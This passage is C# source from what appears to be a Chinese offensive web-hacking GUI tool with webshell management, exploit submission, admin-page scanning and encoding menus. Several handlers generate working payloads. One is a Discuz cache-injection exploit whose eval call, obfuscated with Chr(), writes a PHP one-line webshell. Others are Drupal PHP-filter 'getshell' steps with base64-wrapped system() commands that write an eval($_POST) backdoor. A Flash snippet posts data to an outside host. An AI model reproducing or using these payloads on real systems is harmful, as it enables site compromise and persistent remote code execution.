                string str2 = "\r\n\r\n默认EXP: forumdata/cache/admingroups.php \r\n\r\nGLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(102).Chr(111).Chr(114).Chr(117).Chr(109).Chr(100).Chr(97).Chr(116).Chr(97).Chr(92).Chr(99).Chr(97).Chr(99).Chr(104).Chr(101).Chr(92).Chr(97).Chr(100).Chr(109).Chr(105).Chr(110).Chr(103).Chr(114).Chr(111).Chr(117).Chr(112).Chr(115).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(111).Chr(109).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))\r\n";
                string str3 = builder.ToString() + str2 + "\r\n路径：\t" + str + "\r\n\r\n测试：\tGLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo()\r\n";
                string str4 = "";
                str4 = "密文(PHP_ChrString)：\r\n\r\nGLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(" + K8crack.PHP_ChrCode("fputs(fopen('" + str + "','w'),'<?php @eval($_POST[tom])?>');") + ")\r\n\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str3 + "\r\n\r\n" + str4 + this.k8encodeSplit);
            }
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void drupal后台PHPFilter拿Shell代码ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string str;
            string str4;
            string str5;
            string str6;
            StringBuilder builder;
            string str7;
            string str8;
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                string str2 = "<?php system(base64_decode(\"";
                string str3 = "\"));?>";
                str4 = "";
                str5 = "";
                str6 = "";
                builder = new StringBuilder();
                builder.Append("Drupal 后台php filer GetShell条件:\r\n\r\n");
                builder.Append("1 drupal731/?q=admin/modules 勾选 php filer\r\n");
                builder.Append("2 drupal731/?q=admin/config/content/formats/php_code(php_code不同版本可能不一样)\r\n");
                builder.Append("3 角色这里  Roles  选择administrator  别漏了这个\r\n");
                builder.Append("4 PHP evaluator 这个也勾上\r\n");
                builder.Append("5 然后发布文章 drupal731/?q=node/add/article  选择PHP CODE 就可以了\r\n");
                builder.Append("<?php phpinfo(); ?>   在文章处可看到phpinfo信息\r\n\r\n");
                builder.Append("研究发现带有$号的会被过滤,导致很多GetShell代码失效\r\n");
                builder.Append("部分站点 可以执行system等函数 当然也有不能执行的\r\n\r\n");
                builder.Append("绝对路径EXP：用的是system函数 Linux或Windows均已调好\r\n\r\n");
                str7 = "\r\n\r\n原文：\t<?php eval(fputs(fopen('" + str + "','w'),'<?php eval($_POST[tom])?>'););?>\r\n\r\n";
                str8 = "";
                str8 = "密文(PHP_ChrString)：\r\n\r\n<?php eval(" + K8crack.PHP_ChrCode("fputs(fopen('" + str + "','w'),'<?php eval($_POST[tom])?>');") + ");?>\r\n\r\n";
                if (str.Contains("/"))
                {
                    str = "echo \"<?php @eval(\\$_POST[tom]);?>\">" + str;
                    str4 = "密文Base64(GB2312)：\r\n\r\n" + str2 + K8crack.Base64_encodeGB2312(str) + str3 + "\r\n\r\n";
                    str5 = "密文Base64(UTF8)：\r\n\r\n" + str2 + K8crack.Base64_encodeUTF8(str) + str3 + "\r\n\r\n";
                    str6 = "密文Base64(Unicode)：\r\n\r\n" + str2 + K8crack.Base64_encodeUnicode(str) + str3 + "\r\n\r\n";
                    goto Label_034D;
                }
                if (str.Contains(@":\"))
                {
                    str = "echo ^<?php @eval($_POST[tom]);?^>>" + str;
                    str4 = "密文Base64(GB2312)：\r\n\r\n" + str2 + K8crack.Base64_encodeGB2312(str) + str3 + "\r\n\r\n";
                    str5 = "密文Base64(UTF8)：\r\n\r\n" + str2 + K8crack.Base64_encodeUTF8(str) + str3 + "\r\n\r\n";
                    str6 = "密文Base64(Unicode)：\r\n\r\n" + str2 + K8crack.Base64_encodeUnicode(str) + str3 + "\r\n\r\n";
                    goto Label_034D;
                }
                this.K8msgbox("逗B! 请选中绝对路径,才能生成GetShell代码。\r\n[Linux路径 必须有/ Windows路径 必须有 :\\]");
            }
            return;
        Label_034D:;
            this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + builder.ToString() + "原文：\t" + str + "\r\n\r\n" + str4 + str5 + str6 + str7 + str8 + this.k8encodeSplit);
        }

        private void drupal后台PHPFilter拿Shell相对路径ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("Drupal 后台php filer GetShell条件:\r\n\r\n");
                builder.Append("1 drupal731/?q=admin/modules 勾选 php filer\r\n");
                builder.Append("2 drupal731/?q=admin/config/content/formats/php_code(php_code不同版本可能不一样)\r\n");
                builder.Append("3 角色这里  Roles  选择administrator  别漏了这个\r\n");
                builder.Append("4 PHP evaluator 这个也勾上\r\n");
                builder.Append("5 然后发布文章 drupal731/?q=node/add/article  选择PHP CODE 就可以了\r\n");
                builder.Append("<?php phpinfo(); ?>   在文章处可看到phpinfo信息\r\n\r\n");
                builder.Append("研究发现带有$号的会被过滤,导致很多GetShell代码失效\r\n");
                builder.Append("部分站点 可以执行system等函数 当然也有不能执行的\r\n\r\n");
                builder.Append("相对路径EXP：可用绝对路径也可相对路径 (使用相对路径-前面不能出现/或\\符号)\r\n\r\n");
                string str2 = "默认EXP:\r\n\r\n<?php @eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(115).Chr(105).Chr(116).Chr(101).Chr(115).Chr(47).Chr(100).Chr(101).Chr(102).Chr(97).Chr(117).Chr(108).Chr(116).Chr(47).Chr(102).Chr(105).Chr(108).Chr(101).Chr(115).Chr(47).Chr(102).Chr(105).Chr(101).Chr(108).Chr(100).Chr(47).Chr(105).Chr(109).Chr(97).Chr(103).Chr(101).Chr(47).Chr(105).Chr(110).Chr(99).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(116).Chr(111).Chr(109).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59));?>\r\n\r\n";
                string str3 = builder.ToString() + str2 + "路径：\t" + str + "\r\n\r\n原文：\t<?php @eval(fputs(fopen('" + str + "','w'),'<?php @eval($_POST[tom])?>'));?>\r\n";
                string str4 = "";
                str4 = "密文(PHP_ChrString)：\r\n\r\n<?php @eval(" + K8crack.PHP_ChrCode("fputs(fopen('" + str + "','w'),'<?php @eval($_POST[tom])?>');") + ");?>\r\n\r\n";
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str3 + "\r\n\r\n" + str4 + this.k8encodeSplit);
            }
        }

        private void encodeDecodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_encodeDecode_Click(null, null);
        }

        private void expDebugToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_ExpDebug_Click(null, null);
        }

        private void expDeleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ToolStripDropDownItem item = sender as ToolStripDropDownItem;
            ContextMenuStrip currentParent = item.GetCurrentParent() as ContextMenuStrip;
            Control sourceControl = currentParent.SourceControl;
            if ((MessageBox.Show("您确定要删除:  [" + sourceControl.Text + "]  EXP按钮吗?", "友情提示!", MessageBoxButtons.YesNo) == DialogResult.Yes) && BLLk8EXP.DeleteRecord(int.Parse(sourceControl.Name.Replace("k8ExpBtn_", ""))))
            {
                sourceControl.Parent.Controls.Remove(sourceControl);
            }
        }

        private void expInputToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new frmInputExpDB(this).ShowDialog();
        }

        private void exploitDBToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_EXploitDB_Click(null, null);
        }

        private void expUpdateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ToolStripDropDownItem item = sender as ToolStripDropDownItem;
            ContextMenuStrip currentParent = item.GetCurrentParent() as ContextMenuStrip;
            string id = currentParent.SourceControl.Name.Split(new char[] { '_' })[1];
            string str2 = "";
            string str = "";
            string str4 = "";
            string str5 = "";
            string str6 = "";
            string str7 = "";
            string str8 = "";
            string str9 = "";
            DataSet idDataSet = BLLk8EXP.GetIdDataSet(id);
            foreach (DataRow row in idDataSet.Tables[0].Rows)
            {
                this.k8appName = row["appName"].ToString();
                this.k8btnName = row["btnName"].ToString();
                this.k8btnTip = row["btnTip"].ToString();
                str2 = row["method"].ToString();
                str = row["cookie"].ToString();
                str4 = row["sumbitData"].ToString();
                str5 = row["referer"].ToString();
                str6 = row["userAgent"].ToString();
                str7 = row["encode"].ToString();
                str8 = row["allowRedirect"].ToString();
                str9 = row["addURL"].ToString();
                this.k8btnName = K8crack.K8expBase64(this.k8btnName, 0);
                this.k8btnTip = K8crack.K8expBase64(this.k8btnTip, 0);
                str = K8crack.K8expBase64(str, 0);
                str4 = K8crack.K8expBase64(str4, 0);
                str5 = K8crack.K8expBase64(str5, 0);
                str6 = K8crack.K8expBase64(str6, 0);
                str9 = K8crack.K8expBase64(str9, 0);
                this.txt_k8url.Text = this.txt_ExpURL.Text;
                this.txt_addURL.Text = str9;
                if (str2 == "POST")
                {
                    this.rb_PostMethod.Checked = true;
                }
                else if (str2 == "GET")
                {
                    this.rb_GetMethod.Checked = true;
                }
                else
                {
                    this.rb_none.Checked = true;
                }
                this.txt_RefererURL.Text = str5;
                if (str != "")
                {
                    this.chk_submitCookies.Checked = true;
                }
                else
                {
                    this.chk_submitCookies.Checked = false;
                }
                this.txt_submitCookies.Text = str;
                this.txt_SubmitData.Text = str4;
                this.txt_UserAgent.Text = str6;
                switch (str7)
                {
                    case "65001":
                        this.cbb_expDebugCoding.Text = "UTF-8";
                        break;

                    case "936":
                        this.cbb_expDebugCoding.Text = "GB2312";
                        break;
                }
                if (str8 == "true")
                {
                    this.chk_allowRedirect.Checked = true;
                }
                else if (str8 == "false")
                {
                    this.chk_allowRedirect.Checked = false;
                }
            }
            this.tab_MainForm.SelectedTab = this.tab_MainForm.TabPages["tab_SubmitTest"];
            this.btn_AddUpdateExp.Text = "修改EXP";
            this.k8updateID = id;
            this.btn_AddExp_Click(null, null);
        }

        private void fileASCIIToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() => this.K8readFile2chr("ALL Files|*.*", "", ""));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void fileHexToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Thread thread = new Thread(() => this.K8readFile2Hex("ALL Files|*.*", "", ""));
            thread.SetApartmentState(ApartmentState.STA);
            thread.Start();
        }

        private void fileManageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_WebShell_Click(null, null);
        }

        private void flashAS脚本Post提交post参数ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Copy();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                StringBuilder builder = new StringBuilder();
                builder.Append("密文(Flash Post提交代码)：\r\n\r\n");
                builder.Append("var lv = new LoadVars();\r\n");
                builder.Append(K8crack.FlashPostEncode(str));
                builder.Append("lv.sendAndLoad(\"http://qqhack8.blog.163.com/post.php\", lv, \"POST\");\r\n");
                builder.Append("lv.onLoad = function(success) {\r\n");
                builder.Append("if (success) {\r\n");
                builder.Append("//do somethings\r\n");
                builder.Append("}\r\n");
                builder.Append("};\r\n");
                string str2 = "\r\n原文：\t" + str + "\r\n\r\n" + builder.ToString();
                this.txt_EncodeDecodeText.AppendText("\r\n\r\n" + this.k8encodeSplit + str2 + "\r\n\r\n" + this.k8encodeSplit);
            }
        }

        private void Form_MouseDown(object sender, MouseEventArgs e)
        {
            try
            {
                if (e.Button == MouseButtons.Left)
                {
                    this.isMouseDown = true;
                    this.FormLocation = base.Location;
                    this.mouseOffset = Control.MousePosition;
                }
            }
            catch (Exception)
            {
            }
        }

        private void Form_MouseMove(object sender, MouseEventArgs e)
        {
            try
            {
                int num = 0;
                int num2 = 0;
                if (this.isMouseDown)
                {
                    Point mousePosition = Control.MousePosition;
                    num = this.mouseOffset.X - mousePosition.X;
                    num2 = this.mouseOffset.Y - mousePosition.Y;
                    base.Location = new Point(this.FormLocation.X - num, this.FormLocation.Y - num2);
                }
            }
            catch (Exception)
            {
            }
        }

        private void Form_MouseUp(object sender, MouseEventArgs e)
        {
            try
            {
                this.isMouseDown = false;
            }
            catch (Exception)
            {
            }
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            GC.Collect();
            base.CenterToParent();
            base.MaximizeBox = false;
            this.ScanAdminListViewsSet();
            base.Width = 0x3e8;
            base.Height = 720;
            this.K8setLanguage();
            this.tab_MainForm.TabPages.Remove(this.tab_MainForm.TabPages[11]);
            this.tab_MainForm.TabPages.Remove(this.tab_MainForm.TabPages[10]);
            this.tab_MainForm.TabPages.Remove(this.tab_MainForm.TabPages[6]);
            this.tab_MainForm.TabPages.Remove(this.tab_MainForm.TabPages[4]);
            this.tab_MainForm.SelectTab("tab_SubmitTest");
            this.tab_MainForm.Alignment = TabAlignment.Bottom;
            this.rb_PostMethod.Checked = true;
            this.IsCheckScriptType();
            this.txt_OneShellPwd.UseSystemPasswordChar = true;
            this.lv_DirList.View = View.Details;
            this.lv_DirList.Columns.Add("名称", 400);
            this.lv_DirList.Columns.Add("时间", 150, HorizontalAlignment.Left);
            this.lv_DirList.Columns[1].TextAlign = HorizontalAlignment.Left;
            this.lv_DirList.Columns.Add("大小", 80);
            this.lv_DirList.Columns[2].TextAlign = HorizontalAlignment.Left;
            this.lv_DirList.Columns.Add("属性", 60);
            this.txt_EncodeDecodeText_TextChanged(null, null);
            this.loadK8skin();
            this.lbl_AppICO.Left = 6;
            this.lbl_AppICO.Top = 5;
            this.lbl_appTitle.Left = 0x19;
            this.lbl_appTitle.Top = 8;
            //this.lbl_appTitle.ForeColor = Color.White;
            //this.lbl_K8Holiday.ForeColor = Color.White;
            this.lbl_K8Holiday.Top = this.lbl_appTitle.Top;
            this.lbl_K8Holiday.Left = (base.Width - this.lbl_K8Holiday.Width) - 120;
            this.icoBtn_WebShell.Top = 30;
            this.icoBtn_ExpDebug.Top = this.icoBtn_WebShell.Top;
            this.icoBtn_about.Top = this.icoBtn_WebShell.Top;
            this.icoBtn_CookieBrowser.Top = this.icoBtn_WebShell.Top;
            this.icoBtn_dataOutput.Top = this.icoBtn_WebShell.Top;
            this.icoBtn_CmdShell.Top = this.icoBtn_WebShell.Top;
            this.icoBtn_encodeDecode.Top = this.icoBtn_WebShell.Top;
            this.icoBtn_ScanAdmin.Top = this.icoBtn_WebShell.Top;
            this.icoBtn_XssAnalysis.Top = this.icoBtn_WebShell.Top;
            this.icoBtn_EXploitDB.Top = this.icoBtn_WebShell.Top;
            this.K8SetIcoBtnStyle(this.icoBtn_WebShell);
            this.K8SetIcoBtnStyle(this.icoBtn_ExpDebug);
            this.K8SetIcoBtnStyle(this.icoBtn_about);
            this.K8SetIcoBtnStyle(this.icoBtn_CookieBrowser);
            this.K8SetIcoBtnStyle(this.icoBtn_dataOutput);
            this.K8SetIcoBtnStyle(this.icoBtn_CmdShell);
            this.K8SetIcoBtnStyle(this.icoBtn_encodeDecode);
            this.K8SetIcoBtnStyle(this.icoBtn_EXploitDB);
            this.K8SetIcoBtnStyle(this.icoBtn_ScanAdmin);
            this.K8SetIcoBtnStyle(this.icoBtn_XssAnalysis);
            this.K8loadDataDB();
            this.txt_urlDataOutput.Text = this.IniReadValue("K8dataOutput", "url", k8flyConfig);
            this.txt_sqlDataOutput.Text = this.IniReadValue("K8dataOutput", "exp", k8flyConfig);
            string str = this.IniReadValue("K8dataOutput", "Method", k8flyConfig);
            if (str.ToUpper() == "GET")
            {
                this.rb_GetDataOut.Checked = true;
            }
            else if (str.ToUpper() == "POST")
            {
                this.rb_PostDataOut.Checked = true;
            }
            this.cbb_DataOutEncoding.Text = this.IniReadValue("K8dataOutput", "Coding", k8flyConfig);
            this.txt_minnum.Text = this.IniReadValue("K8dataOutput", "Min", k8flyConfig);
            this.txt_maxnum.Text = this.IniReadValue("K8dataOutput", "Max", k8flyConfig);
            this.txt_ThreadsOutData.Text = this.IniReadValue("K8dataOutput", "Threads", k8flyConfig);
            this.txt_dataOutstartStr.Text = this.IniReadValue("K8dataOutput", "CutStrS", k8flyConfig, "Duplicate entry '");
            this.txt_dataOutEndStr.Text = this.IniReadValue("K8dataOutput", "CutStrE", k8flyConfig, "' for key 'group_key");
            this.txt_dataOutRegex.Text = this.IniReadValue("K8dataOutput", "RegStr", k8flyConfig, "Duplicate entry '(?<k8result>.*?)' for key 'group_key'");
            this.lbl_dataOutRexex.Visible = false;
            this.txt_dataOutRegex.Visible = false;
            this.lbl_dataOutEndStr.Visible = true;
            this.lbl_dataOutStrStart.Visible = true;
            this.txt_dataOutEndStr.Visible = true;
            this.txt_dataOutstartStr.Visible = true;
        }

        private void fromCharCodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                string str = Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text));
                Clipboard.SetDataObject("String.fromCharCode(" + K8crack.K8Ascii_encode(str) + ")");
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private static int GetBannerIco(string banner)
        {
            banner = banner.ToUpper().Trim();
            if (banner.Contains("Apache-Coyote".ToUpper()))
            {
                return 11;
            }
            if (banner.Contains("Apache".ToUpper()))
            {
                return 12;
            }
            if (banner.Contains("IIS".ToUpper()))
            {
                return 13;
            }
            if (banner.Contains("Nginx".ToUpper()))
            {
                return 14;
            }
            if (banner.Contains("Tengine".ToUpper()))
            {
                return 15;
            }
            if (banner.Contains("LiteSpeed".ToUpper()))
            {
                return 0x10;
            }
            if (banner.Contains("lighttpd".ToUpper()))
            {
                return 0x11;
            }
            if (banner.Contains("OpenGSE".ToUpper()))
            {
                return 0x12;
            }
            if (banner.Contains("BWS".ToUpper()))
            {
                return 0x13;
            }
            if (banner.Contains("squid".ToUpper()))
            {
                return 20;
            }
            return 0;
        }

        private static string GetCookies(string url)
        {
            uint pcchCookieData = 0x100;
            StringBuilder pchCookieData = new StringBuilder((int) pcchCookieData);
            if (!InternetGetCookieEx(url, null, pchCookieData, ref pcchCookieData, 0x2000, IntPtr.Zero))
            {
                if (pcchCookieData < 0)
                {
                    return null;
                }
                pchCookieData = new StringBuilder((int) pcchCookieData);
                if (!InternetGetCookieEx(url, null, pchCookieData, ref pcchCookieData, 0x2000, IntPtr.Zero))
                {
                    return null;
                }
            }
            return pchCookieData.ToString();
        }

        public string GetHost2IP(string hostname)
        {
            hostname = GetURLDomain(hostname);
            try
            {
                return Dns.GetHostAddresses(hostname)[0].ToString();
            }
            catch (Exception)
            {
                return "k8error";
            }
        }

        private static string GetHttpBanner(string url)
        {
            HttpWebResponse response;
            url = url.ToLower().Trim();
            if (url.Contains("http"))
            {
                url = "http://" + GetURLDomain(url);
            }
            else if (url.Contains("https"))
            {
                url = "https://" + GetURLDomain(url);
            }
            HttpWebRequest request = null;
            try
            {
                request = (HttpWebRequest) WebRequest.Create(url);
            }
            catch (Exception)
            {
                return "unknown";
            }
            try
            {
                response = (HttpWebResponse) request.GetResponse();
            }
            catch (WebException exception2)
            {
                response = (HttpWebResponse) exception2.Response;
                if (response != null)
                {
                    return response.Server;
                }
                return "unknown";
            }
            return response.Server;
        }

        [DllImport("kernel32.dll")]
        public static extern int GetLastError();
        private string GetMidStr(string Str, string StartStr, string EndStr)
        {
            try
            {
                MatchCollection matchs = new Regex("(?<=" + StartStr + @")[^\[\]]+(?=" + EndStr + ")").Matches(Str);
                foreach (Match match in matchs)
                {
                    return match.Value;
                }
            }
            catch (Exception exception)
            {
                return exception.Message;
            }
            return "";
        }

        [DllImport("kernel32", CharSet=CharSet.Unicode)]
        private static extern int GetPrivateProfileString(string section, string key, string def, StringBuilder retVal, int size, string filePath);
        [DllImport("kernel32.dll")]
        public static extern int GetShortPathName(string path, StringBuilder shortPath, int shortPathLength);
        private string GetStrRegex(string Str, string regexStr)
        {
            if (regexStr != "")
            {
                try
                {
                    Match match = new Regex(regexStr, RegexOptions.IgnoreCase).Match(Str);
                    if (((((((regexStr.Contains("k8result1") & regexStr.Contains("k8result2")) & regexStr.Contains("k8result3")) & regexStr.Contains("k8result4")) & regexStr.Contains("k8result5")) & regexStr.Contains("k8result6")) & regexStr.Contains("k8result7")) & regexStr.Contains("k8result8"))
                    {
                        Str = match.Groups["k8result1"].Value + " | " + match.Groups["k8result2"].Value + " | " + match.Groups["k8result3"].Value + " | " + match.Groups["k8result4"].Value + " | " + match.Groups["k8result5"].Value + " | " + match.Groups["k8result6"].Value + " | " + match.Groups["k8result7"].Value + " | " + match.Groups["k8result8"].Value;
                    }
                    else
                    {
                        if ((((((regexStr.Contains("k8result1") & regexStr.Contains("k8result2")) & regexStr.Contains("k8result3")) & regexStr.Contains("k8result4")) & regexStr.Contains("k8result5")) & regexStr.Contains("k8result6")) & regexStr.Contains("k8result7"))
                        {
                            Str = match.Groups["k8result1"].Value + " | " + match.Groups["k8result2"].Value + " | " + match.Groups["k8result3"].Value + " | " + match.Groups["k8result4"].Value + " | " + match.Groups["k8result5"].Value + " | " + match.Groups["k8result6"].Value + " | " + match.Groups["k8result7"].Value;
                            return Str;
                        }
                        if (((((regexStr.Contains("k8result1") & regexStr.Contains("k8result2")) & regexStr.Contains("k8result3")) & regexStr.Contains("k8result4")) & regexStr.Contains("k8result5")) & regexStr.Contains("k8result6"))
                        {
                            Str = match.Groups["k8result1"].Value + " | " + match.Groups["k8result2"].Value + " | " + match.Groups["k8result3"].Value + " | " + match.Groups["k8result4"].Value + " | " + match.Groups["k8result5"].Value + " | " + match.Groups["k8result6"].Value;
                            return Str;
                        }
                        if ((((regexStr.Contains("k8result1") & regexStr.Contains("k8result2")) & regexStr.Contains("k8result3")) & regexStr.Contains("k8result4")) & regexStr.Contains("k8result5"))
                        {
                            Str = match.Groups["k8result1"].Value + " | " + match.Groups["k8result2"].Value + " | " + match.Groups["k8result3"].Value + " | " + match.Groups["k8result4"].Value + " | " + match.Groups["k8result5"].Value;
                            return Str;
                        }
                        if (((regexStr.Contains("k8result1") & regexStr.Contains("k8result2")) & regexStr.Contains("k8result3")) & regexStr.Contains("k8result4"))
                        {
                            Str = match.Groups["k8result1"].Value + " | " + match.Groups["k8result2"].Value + " | " + match.Groups["k8result3"].Value + " | " + match.Groups["k8result4"].Value;
                            return Str;
                        }
                        if ((regexStr.Contains("k8result1") & regexStr.Contains("k8result2")) & regexStr.Contains("k8result3"))
                        {
                            Str = match.Groups["k8result1"].Value + " | " + match.Groups["k8result2"].Value + " | " + match.Groups["k8result3"].Value;
                            return Str;
                        }
                        if (regexStr.Contains("k8result1") & regexStr.Contains("k8result2"))
                        {
                            Str = match.Groups["k8result1"].Value + " | " + match.Groups["k8result2"].Value;
                            return Str;
                        }
                        if (regexStr.Contains("k8result1"))
                        {
                            Str = match.Groups["k8result1"].Value;
                            return Str;
                        }
                        if (regexStr.Contains("k8result"))
                        {
                            Str = match.Groups["k8result"].Value;
                        }
                    }
                }
                catch (Exception exception)
                {
                    return exception.Message;
                }
            }
            return Str;
        }

        public void GetSubmit()
        {
            string requestUriString = this.txt_k8url.Text.Trim();
            if (requestUriString == "")
            {
                this.Btn_Submit.Enabled = true;
                this.K8msgbox("请先输入目标网址!");
            }
            else
            {
                Exception exception;
                if (!requestUriString.Contains("http://") & !requestUriString.Contains("https://"))
                {
                    requestUriString = "http://" + requestUriString;
                    this.txt_k8url.Text = requestUriString;
                }
                requestUriString = requestUriString + this.txt_addURL.Text.Trim();
                StringBuilder builder = new StringBuilder();
                builder.Append("");
                requestUriString = requestUriString + this.txt_SubmitData.Text.TrimEnd(new char[0]);
                if (requestUriString.Contains("https://"))
                {
                    ServicePointManager.ServerCertificateValidationCallback = new System.Net.Security.RemoteCertificateValidationCallback(this.RemoteCertificateValidationCallback);
                    new X509Store(StoreName.My, StoreLocation.CurrentUser).Open(OpenFlags.OpenExistingOnly);
                }
                HttpWebRequest request = null;
                try
                {
                    request = (HttpWebRequest) WebRequest.Create(requestUriString);
                }
                catch (Exception exception1)
                {
                    exception = exception1;
                    this.K8msgbox(exception.Message);
                    return;
                }
                request.AllowAutoRedirect = false;
                request.Accept = "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*";
                if (this.txt_RefererURL.Text.Trim() != "")
                {
                    request.Referer = this.txt_RefererURL.Text.Trim();
                }
                if (this.chk_allowRedirect.Checked)
                {
                    request.AllowAutoRedirect = true;
                }
                else
                {
                    request.AllowAutoRedirect = false;
                }
                request.ContentType = "application/x-www-form-urlencoded";
                request.UserAgent = this.txt_UserAgent.Text;
                if (this.chk_submitCookies.Checked)
                {
                    string str2 = this.txt_submitCookies.Text.Trim();
                    if (str2 == "")
                    {
                        this.K8msgbox("啊...！你还没填Cookies!");
                        return;
                    }
                    CookieContainer cookieContainer = new CookieContainer();
                    string[] strArray = str2.Split(";".ToCharArray());
                    foreach (string str3 in strArray)
                    {
                        cookieContainer.SetCookies(new Uri(requestUriString), str3);
                    }
                    if (cookieContainer.Count != 0)
                    {
                        request.CookieContainer = cookieContainer;
                    }
                    else
                    {
                        request.CookieContainer = new CookieContainer();
                        cookieContainer = request.CookieContainer;
                    }
                }
                request.KeepAlive = true;
                request.Timeout = int.Parse(this.txt_TimeOut.Text);
                request.Method = "GET";
                request.KeepAlive = true;
                request.ProtocolVersion = HttpVersion.Version10;
                try
                {
                    HttpWebResponse response;
                    try
                    {
                        response = (HttpWebResponse) request.GetResponse();
                    }
                    catch (WebException exception2)
                    {
                        response = (HttpWebResponse) exception2.Response;
                        this.K8msgbox(Convert.ToString((int) response.StatusCode));
                    }
                    StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(this.K8webBrowserEncoding(this.cbb_DataOutEncoding.Text)));
                    this.txt_Result.AppendText(builder.ToString() + reader.ReadToEnd().Trim());
                    reader.Close();
                }
                catch (Exception exception4)
                {
                    exception = exception4;
                    this.txt_Result.AppendText(builder.ToString() + exception.InnerException);
                }
                this.Btn_Submit.Enabled = true;
            }
        }

        private static string GetURLDomain(string HostURL)
        {
            if (HostURL.Contains("http") | HostURL.Contains("ftp"))
            {
                string pattern = "(http|https|ftp)://(?<domain>[^(:|/]*)";
                Match match = new Regex(pattern, RegexOptions.IgnoreCase).Match(HostURL);
                string str2 = match.Groups["domain"].Value;
                HostURL = match.Groups["domain"].Value;
            }
            return HostURL;
        }

        private string getvalue(string str, string start, string end)
        {
            Regex regex = new Regex("(?<=(" + start + @"))[.\s\S]*?(?=(" + end + "))", RegexOptions.Singleline | RegexOptions.Multiline);
            return regex.Match(str.Trim()).Value;
        }

        private void googleHackToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.icoBtn_WebShell_Click(null, null);
        }

        private void hex编码ToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.HexEncodeGB2312(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void hex编码UnicodeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.HexEncodeUnicode(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void hex编码UTF8ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
                Clipboard.SetDataObject(K8crack.HexEncodeUTF8(Convert.ToString(Clipboard.GetDataObject().GetData(DataFormats.Text))));
                this.txt_EncodeDecodeText.Paste();
            }
        }

        private void hex解码ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.txt_EncodeDecodeText.SelectedText.Length > 0)
            {
                this.txt_EncodeDecodeText.Cut();
